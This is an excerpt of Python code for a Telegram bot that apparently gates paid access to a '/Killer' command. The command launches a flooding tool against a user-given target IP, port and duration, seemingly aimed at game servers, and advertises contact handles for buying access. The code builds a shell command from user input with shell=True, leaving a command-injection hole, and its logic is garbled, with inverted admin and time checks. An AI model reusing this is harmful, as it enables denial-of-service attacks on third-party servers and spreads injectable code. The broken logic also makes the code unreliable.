...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "You are not authorised to use this bot:- @TOXICPLAYER002 ❄."
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "You Are On Cooldown ❌. Please Wait 1sec Before Running The /Killer Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 1200:
                ...
                record_command_logs(user_id, 'Killer', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./Killer {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f" Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /Killer <target> <port> <time>"  # Updated command syntax
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /Killer command.                                                                          DM FOR GET ACCESS:- @Mafia_033_082_120")
...
💥 /Killer : Method For Killer Servers. 
...
Get Access From:- @TOXICPLAYER002
'''
